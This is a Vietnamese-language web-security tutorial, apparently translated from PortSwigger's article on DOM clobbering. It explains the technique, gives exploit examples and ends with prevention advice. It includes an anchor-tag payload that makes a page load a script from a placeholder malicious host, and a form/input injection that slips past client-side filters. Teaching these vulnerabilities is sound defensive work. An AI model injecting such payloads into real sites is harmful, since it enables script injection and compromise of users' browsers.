https://portswigger.net/web-security/dom-based/dom-clobbering

# DOM clobbering

## What is DOM clobbering?
DOM clobbering (ghi đè) là một kỹ thuật trong đó bạn đưa HTML vào một trang để thao tác với DOM và cuối cùng thay đổi hành vi của JavaScript trên trang. Việc ghi đè DOM đặc biệt hữu ích trong trường hợp `không thể thực hiện được XSS`, nhưng bạn có thể kiểm soát một số HTML trên trang có thuộc tính `id` hoặc `name` được bộ lọc HTML đưa vào white list. Hình thức ghi đè DOM phổ biến nhất sử dụng phần tử neo để ghi đè biến toàn cục, sau đó biến này sẽ được ứng dụng sử dụng theo cách không an toàn, chẳng hạn như tạo URL tập lệnh động.\
Thuật ngữ ghi đè xuất phát từ thực tế là bạn đang "ghi đè" một biến toàn cục hoặc thuộc tính của một đối tượng và thay vào đó ghi đè lên nó bằng DOM node hoặc HTML collection. Ví dụ: bạn có thể sử dụng các đối tượng DOM để ghi đè các đối tượng JavaScript khác và khai thác các tên không an toàn, chẳng hạn như gửi, để can thiệp vào hàm `submit()` của biểu mẫu.

## How to exploit DOM-clobbering vulnerabilities
Một pattern phổ biến được nhiều JavaScript dev sử dụng là:\
`var someObject = window.someObject || {};`\
Nếu bạn có thể kiểm soát một số HTML trên trang, bạn có thể ghi đè tham chiếu `someObject` bằng nút DOM, chẳng hạn như một neo. Hãy xem đoạn code:\
```
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```
Để khai thác mã dễ bị tấn công này, bạn có thể chèn đoạn HTML sau để chặn tham chiếu `someObject` bằng phần tử neo:\
`<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>`\
Vì hai điểm neo sử dụng cùng một ID nên DOM sẽ nhóm chúng lại với nhau trong một DOM collection. Sau đó, vectơ ghi đè DOM sẽ ghi đè tham chiếu `someObject` bằng DOM collection này. Thuộc tính `name` được sử dụng trên phần tử neo cuối cùng để ghi đè thuộc tính `url` của đối tượng `someObject`, trỏ đến một tập lệnh bên ngoài.\
Một kỹ thuật phổ biến khác là sử dụng một phần tử `form` cùng với một phần tử chẳng hạn như `input` cho các thuộc tính DOM bị ghi đè. Ví dụ: việc ghi đè thuộc tính `attributes` cho phép bạn bỏ qua các bộ lọc phía máy khách sử dụng thuộc tính đó trong logic của chúng. Mặc dù bộ lọc sẽ liệt kê thuộc tính `attributes`, nhưng nó sẽ không thực sự xóa bất kỳ thuộc tính nào vì thuộc tính đó đã bị ghi đè bằng DOM node. Do đó, bạn sẽ có thể đưa vào các thuộc tính độc hại mà thông thường sẽ được lọc ra. Ví dụ, hãy xem xét việc tiêm sau:\
`<form onclick=alert(1)><input id=attributes>Click me`\
Trong trường hợp này, bộ lọc phía máy khách sẽ duyệt qua DOM và gặp phần tử `form` trong whitelist. Thông thường, bộ lọc sẽ lặp qua thuộc tính `atrributes` của thành phần `form` và xóa mọi thuộc tính nằm trong black list. Tuy nhiên, do thuộc tính `attributes` đã bị ghi đè bằng phần tử `input` nên bộ lọc sẽ lặp qua phần tử `input`. Vì phần tử `input` có độ dài không xác định nên các điều kiện cho vòng lặp for của bộ lọc (ví dụ: i < element.attributes.length) không được đáp ứng và thay vào đó, bộ lọc chỉ chuyển sang phần tử tiếp theo. Điều này dẫn đến sự kiện `onclick` bị bộ lọc bỏ qua hoàn toàn, sau đó cho phép gọi hàm `notification()` trong trình duyệt.
## How to prevent DOM-clobbering attacks
Trong thuật ngữ đơn giản nhất, bạn có thể ngăn chặn các cuộc tấn công chặn DOM bằng cách thực hiện kiểm tra để đảm bảo rằng các đối tượng hoặc chức năng đúng như những gì bạn mong đợi. Ví dụ: bạn có thể kiểm tra xem thuộc tính thuộc tính của nút DOM có thực sự là một phiên bản của `NamedNodeMap` hay không. Điều này đảm bảo rằng thuộc tính là thuộc tính `attributes` chứ không phải phần tử HTML bị ghi đè.\
Bạn cũng nên tránh viết mã tham chiếu biến toàn cục kết hợp với toán tử logic OR `||`, vì điều này có thể dẫn đến các lỗ hổng ghi đè DOM.\
Tóm lại:
- Kiểm tra xem các đối tượng và chức năng có hợp pháp không. Nếu bạn đang lọc DOM, hãy đảm bảo rằng bạn kiểm tra xem đối tượng hoặc hàm đó có phải là nút DOM hay không.
- Tránh các mẫu mã xấu. Nên tránh sử dụng các biến toàn cục kết hợp với toán tử logic OR.
- Sử dụng thư viện đã được kiểm tra kỹ lưỡng, chẳng hạn như DOMPurify, để giải quyết các lỗ hổng chặn DOM.








